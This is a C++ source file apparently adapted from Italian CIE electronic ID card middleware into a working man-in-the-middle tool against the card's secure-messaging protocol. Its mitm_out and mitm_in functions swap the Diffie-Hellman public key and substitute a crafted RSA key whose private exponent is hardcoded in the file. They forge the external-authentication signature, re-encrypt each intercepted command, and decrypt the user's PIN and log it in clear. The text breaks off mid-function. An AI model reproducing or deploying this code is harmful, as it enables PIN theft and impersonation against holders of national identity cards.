//
//  AbilitaCIE.cpp
//  cie-pkcs11
//
//  Created by ugo chirico on 06/10/18. http://www.ugochirico.com
//  SPDX-License-Identifier: BSD-3-Clause
//
#include <string.h>
#include "IAS.h"
#include "../PKCS11/wintypes.h"
#include "../PKCS11/PKCS11Functions.h"
#include "../PKCS11/Slot.h"
#include "../Util/ModuleInfo.h"
#include "../Crypto/sha256.h"
#include "../Crypto/sha512.h"
#include <functional>
#include "../Crypto/ASNParser.h"
#include <string>
#include "AbilitaCIE.h"
#include <string>
#include "../Cryptopp/misc.h"

#include "../Crypto/ASNParser.h"
#include <stdio.h>
#include "../Crypto/RSA.h"
#include "../Crypto/AES.h"
#include "../Cryptopp/cryptlib.h"
#include "../Cryptopp/asn.h"
#include "../Util/CryptoppUtils.h"
#include "../Crypto/CryptoUtil.h"
#include "../Sign/CIESign.h"
#include "../Sign/CIEVerify.h"

#include <unistd.h>
#include <sys/socket.h>    //socket
#include <arpa/inet.h>    //inet_addr
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>

#include "../LOGGER/Logger.h"

using namespace CieIDLogger;

#define ROLE_USER 				1
#define ROLE_ADMIN 				2
#define CARD_ALREADY_ENABLED	0x000000F0;

#include "../Crypto/DES3.h"
#include "../Crypto/MAC.h"
#include "../Crypto/sha512.h"
typedef enum {
  START,
  INIT_DH_PARAM,
  READ_DAPP_PUBKEY,
  DH_KEY_EXCHANGE,
  DAPP,
  VERIFYPIN,
  READSERIALECIE,
  READCERTCIE,
  END
} STAGE;

STAGE stage = START;
CASNParser parser;
CSHA256 sha256;

uint8_t defModule[] = { 0xba, 0x28, 0x37, 0xab, 0x4c, 0x6b, 0xb8, 0x27, 0x57, 0x7b, 0xff, 0x4e, 0xb7, 0xb1, 0xe4, 0x9c, 0xdd, 0xe0, 0xf1, 0x66, 0x14, 0xd1, 0xef, 0x24, 0xc1, 0xb7, 0x5c, 0xf7, 0x0f, 0xb1, 0x2c, 0xd1, 0x8f, 0x4d, 0x14, 0xe2, 0x81, 0x4b, 0xa4, 0x87, 0x7e, 0xa8, 0x00, 0xe1, 0x75, 0x90, 0x60, 0x76, 0xb5, 0x62, 0xba, 0x53, 0x59, 0x73, 0xc5, 0xd8, 0xb3, 0x78, 0x05, 0x1d, 0x8a, 0xfc, 0x74, 0x07, 0xa1, 0xd9, 0x19, 0x52, 0x9e, 0x03, 0xc1, 0x06, 0xcd, 0xa1, 0x8d, 0x69, 0x9a, 0xfb, 0x0d, 0x8a, 0xb4, 0xfd, 0xdd, 0x9d, 0xc7, 0x19, 0x15, 0x9a, 0x50, 0xde, 0x94, 0x68, 0xf0, 0x2a, 0xb1, 0x03, 0xe2, 0x82, 0xa5, 0x0e, 0x71, 0x6e, 0xc2, 0x3c, 0xda, 0x5b, 0xfc, 0x4a, 0x23, 0x2b, 0x09, 0xa4, 0xb2, 0xc7, 0x07, 0x45, 0x93, 0x95, 0x49, 0x09, 0x9b, 0x44, 0x83, 0xcb, 0xae, 0x62, 0xd0, 0x09, 0x96, 0x74, 0xdb, 0xf6, 0xf3, 0x9b, 0x72, 0x23, 0xa9, 0x9d, 0x88, 0xe3, 0x3f, 0x1a, 0x0c, 0xde, 0xde, 0xeb, 0xbd, 0xc3, 0x55, 0x17, 0xab, 0xe9, 0x88, 0x0a, 0xab, 0x24, 0x0e, 0x1e, 0xa1, 0x66, 0x28, 0x3a, 0x27, 0x4a, 0x9a, 0xd9, 0x3b, 0x4b, 0x1d, 0x19, 0xf3, 0x67, 0x9f, 0x3e, 0x8b, 0x5f, 0xf6, 0xa1, 0xe0, 0xed, 0x73, 0x6e, 0x84, 0xd5, 0xab, 0xe0, 0x3c, 0x59, 0xe7, 0x34, 0x6b, 0x42, 0x18, 0x75, 0x5d, 0x75, 0x36, 0x6c, 0xbf, 0x41, 0x36, 0xf0, 0xa2, 0x6c, 0x3d, 0xc7, 0x0a, 0x69, 0xab, 0xaa, 0xf6, 0x6e, 0x13, 0xa1, 0xb2, 0xfa, 0xad, 0x05, 0x2c, 0xa6, 0xec, 0x9c, 0x51, 0xe2, 0xae, 0xd1, 0x4d, 0x16, 0xe0, 0x90, 0x25, 0x4d, 0xc3, 0xf6, 0x4e, 0xa2, 0xbd, 0x8a, 0x83, 0x6b, 0xba, 0x99, 0xde, 0xfa, 0xcb, 0xa3, 0xa6, 0x13, 0xae, 0xed, 0xd9, 0x3a, 0x96, 0x15, 0x27, 0x3d };
uint8_t defPrivExp[] = { 0x47, 0x16, 0xc2, 0xa3, 0x8c, 0xcc, 0x7a, 0x07, 0xb4, 0x15, 0xeb, 0x1a, 0x61, 0x75, 0xf2, 0xaa, 0xa0, 0xe4, 0x9c, 0xea, 0xf1, 0xba, 0x75, 0xcb, 0xa0, 0x9a, 0x68, 0x4b, 0x04, 0xd8, 0x11, 0x18, 0x79, 0xd3, 0xe2, 0xcc, 0xd8, 0xb9, 0x4d, 0x3c, 0x5c, 0xf6, 0xc5, 0x57, 0x53, 0xf0, 0xed, 0x95, 0x87, 0x91, 0x0b, 0x3c, 0x77, 0x25, 0x8a, 0x01, 0x46, 0x0f, 0xe8, 0x4c, 0x2e, 0xde, 0x57, 0x64, 0xee, 0xbe, 0x9c, 0x37, 0xfb, 0x95, 0xcd, 0x69, 0xce, 0xaf, 0x09, 0xf4, 0xb1, 0x35, 0x7c, 0x27, 0x63, 0x14, 0xab, 0x43, 0xec, 0x5b, 0x3c, 0xef, 0xb0, 0x40, 0x3f, 0x86, 0x8f, 0x68, 0x8e, 0x2e, 0xc0, 0x9a, 0x49, 0x73, 0xe9, 0x87, 0x75, 0x6f, 0x8d, 0xa7, 0xa1, 0x01, 0xa2, 0xca, 0x75, 0xa5, 0x4a, 0x8c, 0x4c, 0xcf, 0x9a, 0x1b, 0x61, 0x47, 0xe4, 0xde, 0x56, 0x42, 0x3a, 0xf7, 0x0b, 0x20, 0x67, 0x17, 0x9c, 0x5e, 0xeb, 0x64, 0x68, 0x67, 0x86, 0x34, 0x78, 0xd7, 0x52, 0xc7, 0xf4, 0x12, 0xdb, 0x27, 0x75, 0x41, 0x57, 0x5a, 0xa0, 0x61, 0x9d, 0x30, 0xbc, 0xcc, 0x8d, 0x87, 0xe6, 0x17, 0x0b, 0x33, 0x43, 0x9a, 0x2c, 0x93, 0xf2, 0xd9, 0x7e, 0x18, 0xc0, 0xa8, 0x23, 0x43, 0xa6, 0x01, 0x2a, 0x5b, 0xb1, 0x82, 0x28, 0x08, 0xf0, 0x1b, 0x5c, 0xfd, 0x85, 0x67, 0x3a, 0xc0, 0x96, 0x4c, 0x5f, 0x3c, 0xfd, 0x2d, 0xaf, 0x81, 0x42, 0x35, 0x97, 0x64, 0xa9, 0xad, 0xb9, 0xe3, 0xf7, 0x6d, 0xb6, 0x13, 0x46, 0x1c, 0x1b, 0xc9, 0x13, 0xdc, 0x9a, 0xc0, 0xab, 0x50, 0xd3, 0x65, 0xf7, 0x7c, 0xb9, 0x31, 0x94, 0xc9, 0x8a, 0xa9, 0x66, 0xd8, 0x9c, 0xdd, 0x55, 0x51, 0x25, 0xa5, 0xe5, 0x9e, 0xcf, 0x4f, 0xa3, 0xf0, 0xc3, 0xfd, 0x61, 0x0c, 0xd3, 0xd0, 0x56, 0x43, 0x93, 0x38, 0xfd, 0x81 };
uint8_t defPubExp[] = { 0x00, 0x01, 0x00, 0x01 };
ByteDynArray module = VarToByteArray(defModule);
ByteDynArray pubexp = VarToByteArray(defPubExp);
ByteDynArray privexp = VarToByteArray(defPrivExp);
BYTE *curr_apdu = NULL;
DWORD curr_apduSize = 0;
BYTE *prev_apdu = NULL;
DWORD prev_apduSize;

//READ_DAPP_PUBKEY
BYTE read_ReadDappPubKey[] = {0x00, 0xa4, 0x02, 0x04, 0x02, 0x10, 0x04};
BYTE adpu_PubKey1[] = {0x00, 0xb0, 0x00, 0x00, 0x80};
BYTE adpu_PubKey2[] = {0x00, 0xb0, 0x00, 0x80, 0x80};
BYTE adpu_PubKey3[] = {0x00, 0xb0, 0x01, 0x00, 0x80};

//INIT_DH_PARAM
ByteDynArray dh_g;
BYTE dh_gBytes[256] = {};
ByteDynArray dh_p;
BYTE dh_pBytes[256] = {};
ByteDynArray dh_q;
BYTE apdu_getDHDuopData_g[] = {  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x97, 0x00 };
BYTE apdu_getDHDuopData_getData[] = { 0x00, 0xc0, 0x00, 0x00, 0x12 };
BYTE apdu_getDHDuopData_p[] = {  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x98, 0x00 };
BYTE apdu_getDHDuopData_q[] = {  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x99, 0x00 };

//DH_KEY_EXCHANGE
BYTE MSE_SET1[] = { 0x10, 0x22, 0x41, 0xa6 };
BYTE MSE_SET2[] = { 0x00, 0x22, 0x41, 0xa6 };
BYTE apdu_GET_DATA_Data1[] = { 0x00, 0xcb, 0x3f, 0xff, 0x06, 0x4d, 0x04, 0xa6, 0x02, 0x91, 0x00 };
BYTE apdu_GET_DATA_Data2[] = { 0x00, 0xc0, 0x00, 0x00, 0x08 };
ByteDynArray dh_IFDpubKey, dh_ICCpubKey;
ByteDynArray dh_pubKey_mitm, dh_prKey_mitm;
BYTE *dh_pubKey_mitmBytes;
BYTE dh_IFDpubKeyBytes[256] = {};
BYTE dh_ICCpubKeyBytes[256] = {};
uint8_t diffENC[] = { 0x00, 0x00, 0x00, 0x01 };
uint8_t diffMAC[] = { 0x00, 0x00, 0x00, 0x02 };
ByteDynArray sessENC_IFD, sessMAC_IFD, sessSSC_IFD;
ByteDynArray sessENC_ICC, sessMAC_ICC, sessSSC_ICC;

//DAPP
uint8_t SelectKey[] = { 0x0c, 0x22, 0x81, 0xb6 };
uint8_t VerifyCert1[] = { 0x1c, 0x2A, 0x00, 0xAE };
uint8_t VerifyCert2[] = { 0x0c, 0x2A, 0x00, 0xAE };
uint8_t SetCHR[] = { 0x0c, 0x22, 0x81, 0xA4 };
uint8_t GetChallenge[] = { 0x0c, 0x84, 0x00, 0x00 };
uint8_t ExtAuth1[] = { 0x1c, 0x82, 0x00, 0x00 };
uint8_t ExtAuth2[] = { 0x0c, 0x82, 0x00, 0x00 };
uint8_t IntAuth[] = { 0x0c, 0x22, 0x41, 0xa4 };
uint8_t GiveRandom[] = { 0x0c, 0x88, 0x00, 0x00 };

uint8_t sn_icc[8] = { 0x00, 0x68, 0x37, 0x56, 0x18, 0x03, 0x30, 0x1f };
ByteArray sn_iccBa = VarToByteArray(sn_icc);
BYTE certenc[354] = {};
BYTE buffer_resp[293] = {};
ByteDynArray challenge;
ByteDynArray chResponse;
uint8_t snIFD[] = { 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
ByteArray snIFDBa = VarToByteArray(snIFD);
ByteDynArray PRND2(222);
ByteDynArray toHashIFD;
ByteDynArray rndIFD;
ByteDynArray intAuthresp;
ByteDynArray SIG;
ByteDynArray intAuthSMresp;
 
//READSERIALECIE && READCERTCIE
uint8_t selectFile[] = { 0x0c, 0xa4, 0x02, 0x04 };
uint8_t readFile[] = { 0x0c, 0xb0, 0x00, 0x00 };
WORD cnt = 0;


void increment(ByteArray &seq) {
	for (size_t i = seq.size() - 1; i >= 0; i--) {
		if (seq[i] < 255) {
			seq[i]++;
			for (size_t j = i + 1; j < seq.size(); j++)
				seq[j] = 0;
			return;
		}
	}
}

ByteArray craft_respSM(ByteArray &keyEnc, ByteArray &keySig, ByteDynArray &resp, ByteArray &seq) {
	increment(sessSSC_ICC);
	increment(sessSSC_IFD);
	ByteDynArray calcMac;
	ByteDynArray swBa, tagMacBa;
	ByteDynArray iv(8);
	iv.fill(0); // IV for APDU encryption should be 0. Please refer to IAS specification §7.1.9 Secure messaging – Command APDU protection
	CDES3 encDes(keyEnc, iv);
	CMAC sigMac(keySig, iv);

	calcMac = seq;
	calcMac.append(resp.mid(0, resp[0 + 1] + 2));

	BYTE sw[2] = {0x90, 0x00};
	BYTE tagMac[2] = { 0x8e, 0x08};
	swBa = VarToByteArray(sw);
	tagMacBa = VarToByteArray(tagMac);


	ByteDynArray tmp = resp.mid(0, resp[0 + 1] + 2);
	auto smMac = sigMac.Mac(ISOPad(calcMac));
	resp.set(&tmp, &tagMacBa, &smMac, &swBa);
	return resp;
}


ByteDynArray SM(ByteArray &keyEnc, ByteArray &keySig, ByteArray &apdu, ByteArray &seq) {
	init_func

	std::string dmp;
	ODS(dumpHexData(seq, dmp).c_str());

	increment(sessSSC_ICC);
	increment(sessSSC_IFD);

    ODS(dumpHexData(seq, dmp).c_str());

	ByteDynArray smHead;
	smHead = apdu.left(4);
	smHead[0] |= 0x0C;
//    printf("apdu: %s\n", dumpHexData(smHead).c_str());

	auto calcMac = ISOPad(ByteDynArray(seq).append(smHead));

//    printf("calcMac: %s\n", dumpHexData(calcMac).c_str());

	ByteDynArray iv(8);
	iv.fill(0); // IV for APDU encryption and signature should be 0. Please refer to IAS specification §7.1.9 Secure messaging – Command APDU protection

//    printf("iv: %s\n", dumpHexData(iv).c_str());

//    printf("keyEnc: %s\n", dumpHexData(keyEnc).c_str());
	CDES3 encDes(keyEnc, iv);

//    printf("keySig: %s\n", dumpHexData(keySig).c_str());

    CMAC sigMac(keySig, iv);

	uint8_t Val01 = 1;
//    uint8_t Val00 = 0;

	ByteDynArray datafield, doob;
	if (apdu[4] != 0 && apdu.size() > 5) {

        ByteDynArray enc = encDes.RawEncode(ISOPad(apdu.mid(5, apdu[4])));

//        printf("enc 1: %s\n", dumpHexData(enc).c_str());

		if ((apdu[1] & 1) == 0)
			doob.setASN1Tag(0x87, VarToByteDynArray(Val01).append(enc));
		else
			doob.setASN1Tag(0x85, enc);

		calcMac.append(doob);
		datafield.append(doob);

//        printf("calcMac 1: %s\n", dumpHexData(calcMac).c_str());
//        printf("datafield 1: %s\n", dumpHexData(datafield).c_str());
	}
	if (apdu[4] == 0 && apdu.size() > 7) {

		ByteDynArray enc = encDes.RawEncode(ISOPad(apdu.mid(7, (apdu[5] << 8)| apdu[6] )));
		if ((apdu[1] & 1) == 0)
			doob.setASN1Tag(0x87, VarToByteDynArray(Val01).append(enc));
		else
			doob.setASN1Tag(0x85, enc);

		calcMac.append(doob);
		datafield.append(doob);

//        printf("calcMac 2: %s\n", dumpHexData(calcMac).c_str());
//        printf("datafield 2: %s\n", dumpHexData(datafield).c_str());
	}
	if (apdu.size() == 5 || apdu.size() == (apdu[4] + 6)) {
		uint8_t le = apdu[apdu.size() - 1];
        ByteArray leBa = VarToByteArray(le);
		doob.setASN1Tag(0x97, leBa);
		calcMac.append(doob);
		datafield.append(doob);

//        printf("calcMac 3: %s\n", dumpHexData(calcMac).c_str());
//        printf("datafield 3: %s\n", dumpHexData(datafield).c_str());
	}

    ByteDynArray macBa = sigMac.Mac(ISOPad(calcMac));
//    printf("macBa: %s\n", dumpHexData(macBa).c_str());

    ByteDynArray tagMacBa = ASN1Tag(0x8e, macBa);
//    printf("tagMacBa: %s\n", dumpHexData(tagMacBa).c_str());
	datafield.append(tagMacBa);

//    printf("datafield 4: %s\n", dumpHexData(datafield).c_str());

	ByteDynArray elabResp;
	if (datafield.size()<0x100)
		elabResp.set(&smHead, (uint8_t)datafield.size(), &datafield, (uint8_t)0x00);
	else {
		auto len = datafield.size();
		auto lenBA = VarToByteArray(len);
        ByteArray lenBa = lenBA.reverse().right(3);

		elabResp.set(&smHead, &lenBa, &datafield, (uint8_t)0x00, (uint8_t)0x00);
	}

//    printf("elabResp: %s\n", dumpHexData(elabResp).c_str());
	return elabResp;
}

void mitm_out(BYTE *apdu, DWORD apduSize) {
	prev_apduSize = curr_apduSize;
	prev_apdu = (BYTE *) realloc(prev_apdu, sizeof(BYTE) * prev_apduSize);
	memcpy(prev_apdu, curr_apdu, prev_apduSize);

	curr_apdu = (BYTE *) realloc(curr_apdu, sizeof(BYTE) * apduSize);
	curr_apduSize = apduSize;
	memcpy(curr_apdu, apdu, apduSize);
	switch (stage) {
	case START:
		if (memcmp(curr_apdu, apdu_getDHDuopData_g, 17) == 0) {
			stage = INIT_DH_PARAM;
		}
		break;
	case DH_KEY_EXCHANGE:
		if (memcmp(curr_apdu, MSE_SET1, 4) == 0) {
			//creating dh private/public key for mitm
			do {
				dh_prKey_mitm.resize(dh_q.size());
				dh_prKey_mitm.random();
			} while (dh_q[0] < dh_prKey_mitm[0]);
			dh_prKey_mitm.right(1)[0] |= 1;
			ByteDynArray dhg(dh_g.size());
			dhg.fill(0);
			dhg.rightcopy(dh_g);

			LOG_DEBUG("dh_p:");
			LOG_BUFFER(dh_p.data(), dh_p.size());
			CRSA rsa(dh_p, dh_prKey_mitm);

			dh_pubKey_mitm = rsa.RSA_PURE(dhg);
			dh_pubKey_mitmBytes = dh_pubKey_mitm.data();
			
			// saving dh pub key of the IFD
			memcpy(dh_IFDpubKeyBytes, apdu+15, apduSize-15);

			// sendind to the ICC the dh pub key of the mitm
			memcpy(apdu+15, dh_pubKey_mitmBytes, apduSize-15);
		}else if (memcmp(curr_apdu, MSE_SET2, 4) == 0) {
			// doing same thing as before but since the key is big
			// the operation is splitted in two apdus
			memcpy(dh_IFDpubKeyBytes+245, apdu+5, 11);

			memcpy(apdu+5, dh_pubKey_mitmBytes+245, 11);
	
		}
		
		break;
	case DAPP:
		if (memcmp(apdu, SelectKey, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[8];
			memcpy(supp,apdu+8,8);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x22, 0x81, 0xb6 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, le);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, VerifyCert1, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[232];
			memcpy(supp,apdu+9,232);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x10, 0x2A, 0x00, 0xAE };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, VerifyCert2, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[128];
			memcpy(supp,apdu+9,128);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x2A, 0x00, 0xAE };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, SetCHR, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[16];
			memcpy(supp,apdu+8,16);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x22, 0x81, 0xA4 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, GetChallenge, 4) == 0) {
			ByteDynArray smApdu;
			uint8_t chLen = 8;
			BYTE head[] = { 0x00, 0x84, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			ByteDynArray data = ByteDynArray();
			smApdu.set(&headBa, (uint8_t)data.size(), &data, chLen);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, ExtAuth1, 4) == 0) {
			// crafting ext auth message
			ByteDynArray toHash, toSign;
			size_t padSize = 222;
			ByteDynArray PRND(padSize);
			PRND.random();
			toHash.set(&PRND, &dh_pubKey_mitm, &snIFDBa, &challenge, &dh_ICCpubKey, &dh_g, &dh_p, &dh_q);
    		ByteDynArray toHashBa = sha256.Digest(toHash);
			toSign.set(0x6a, &PRND, &toHashBa, 0xBC);
		
			CRSA certKey(module, privexp);
		
			ByteDynArray signResp = certKey.RSA_PURE(toSign);
			chResponse.set(&snIFDBa, &signResp);
			
			// crafting SM apdu
			BYTE supp[231];
			memcpy(supp,chResponse.data(),231);
			ByteArray data = VarToByteArray(supp);
			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x10, 0x82, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
			LOG_DEBUG("Remaining: %d", chResponse.size()-231);
		} else if (memcmp(apdu, ExtAuth2, 4) == 0) {
			BYTE supp[33];
			memcpy(supp,chResponse.data() + 231,33);
			ByteArray data = VarToByteArray(supp);
			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x82, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, IntAuth, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[8];
			memcpy(supp,apdu+8,8);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray data = encDes.RawDecode(encData);
			data.resize(RemoveISOPad(data),true);
			LOG_DEBUG("data dec:");
			LOG_BUFFER(data.data(), data.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x22, 0x41, 0xa4 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());
		} else if (memcmp(apdu, GiveRandom, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[16];
			memcpy(supp,apdu+8,16);
			ByteArray encData = VarToByteArray(supp);
			rndIFD = encDes.RawDecode(encData);
			rndIFD.resize(RemoveISOPad(rndIFD),true);
			LOG_DEBUG("rndIFD dec:");
			LOG_BUFFER(rndIFD.data(), rndIFD.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			uint8_t le = 0;
			BYTE head[] = { 0x00, 0x88, 0x00, 0x00 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)rndIFD.size(), &rndIFD, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		}
		break;
	case VERIFYPIN:
		{
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes(sessENC_IFD, iv);
			BYTE supp[16];
			memcpy(supp,apdu+8,16);
			ByteArray encData = VarToByteArray(supp);
			ByteDynArray decPin = encDes.RawDecode(encData);
			decPin.resize(RemoveISOPad(decPin),true);
			LOG_DEBUG("PIN dec:");
			LOG_BUFFER(decPin.data(), decPin.size());

			ByteArray emptyBa;
			ByteDynArray smApdu;
			BYTE head[] = { 0x00, 0x20, 0x00, 0x81 };
			ByteArray headBa = VarToByteArray(head);
			smApdu.set(&headBa, (uint8_t)decPin.size(), &decPin, &emptyBa);
			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
			memcpy(apdu, smApdu.data(), smApdu.size());

			LOG_DEBUG("apdu modified:");
			LOG_BUFFER(smApdu.data(), smApdu.size());
		}
		break;
    case READSERIALECIE:
        if (memcmp(apdu, selectFile, 4) == 0) {
            ByteArray emptyBa;
            ByteDynArray smApdu;
            BYTE head[] = { 0x00, 0xa4, 0x02, 0x04 };
            ByteArray headBa = VarToByteArray(head);
            uint8_t data[] = {0x10, 0x02};
            ByteDynArray dataBa = VarToByteDynArray(data);
            smApdu.set(&headBa, (uint8_t)dataBa.size(), &dataBa, &emptyBa);
            smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
            memcpy(apdu, smApdu.data(), smApdu.size());

            LOG_DEBUG("apdu modified:");
            LOG_BUFFER(smApdu.data(), smApdu.size());
        }
        if (memcmp(apdu, readFile, 4) == 0) {
	        uint8_t chunk = 128;
            ByteDynArray smApdu;
            BYTE head[] = { 0x00, 0xb0, HIBYTE(cnt), LOBYTE(cnt) };
            ByteArray headBa = VarToByteArray(head);
            ByteDynArray dataBa = ByteDynArray();
            smApdu.set(&headBa, (uint8_t)dataBa.size(), &dataBa, chunk);
            smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
            memcpy(apdu, smApdu.data(), smApdu.size());

            LOG_DEBUG("apdu modified:");
            LOG_BUFFER(smApdu.data(), smApdu.size());
        }
		break;
	case READCERTCIE:
		if (memcmp(apdu, selectFile, 4) == 0) {
            ByteArray emptyBa;
            ByteDynArray smApdu;
            BYTE head[] = { 0x00, 0xa4, 0x02, 0x04 };
            ByteArray headBa = VarToByteArray(head);
            uint8_t data[] = {0x10, 0x02};
            ByteDynArray dataBa = VarToByteDynArray(data);
            smApdu.set(&headBa, (uint8_t)dataBa.size(), &dataBa, &emptyBa);
            smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
            memcpy(apdu, smApdu.data(), smApdu.size());

            LOG_DEBUG("apdu modified:");
            LOG_BUFFER(smApdu.data(), smApdu.size());
        }
		if (memcmp(apdu, readFile, 4) == 0) {
	        uint8_t chunk = 128;
            ByteDynArray smApdu;
            BYTE head[] = { 0x00, 0xb0, HIBYTE(cnt), LOBYTE(cnt) };
            ByteArray headBa = VarToByteArray(head);
            ByteDynArray dataBa = ByteDynArray();
            smApdu.set(&headBa, (uint8_t)dataBa.size(), &dataBa, chunk);
            smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
            memcpy(apdu, smApdu.data(), smApdu.size());

            LOG_DEBUG("apdu modified:");
            LOG_BUFFER(smApdu.data(), smApdu.size());
        }
		break;
	default:
		break;
	}
}

void mitm_in(BYTE *resp, DWORD *respSize) {
	switch (stage) {
	case START:
		break;
	case READ_DAPP_PUBKEY:
		LOG_DEBUG("READ_DAPP_PUBKEY");
		if (memcmp(curr_apdu, adpu_PubKey1, 5) == 0) {
			// sunstitute in the response the crafted pub key of the mitm
			// used for internal auth
			memcpy(resp+9, defModule, (*respSize)-11);
		}else if (memcmp(curr_apdu, adpu_PubKey2, 5) == 0) {
			// same as before but since the pub key is big
			// the operation is splitted in multiple apdus
			memcpy(resp, defModule+119, (*respSize)-2);
		}else if (memcmp(curr_apdu, adpu_PubKey3, 5) == 0) {
			// same as before but since the pub key is big
			// the operation is splitted in multiple apdus
			memcpy(resp, defModule+247, 9);
			stage = DH_KEY_EXCHANGE;
		}
		break;
	case INIT_DH_PARAM:
		LOG_DEBUG("INIT_DH_PARAM");
		// simply saving the dh parameters returned by the ICC
		if (memcmp(curr_apdu, apdu_getDHDuopData_g, 17) == 0) {
			memcpy(dh_gBytes, resp+18, (*respSize)-20);
		}
		if (memcmp(curr_apdu, apdu_getDHDuopData_p, 17) == 0) {
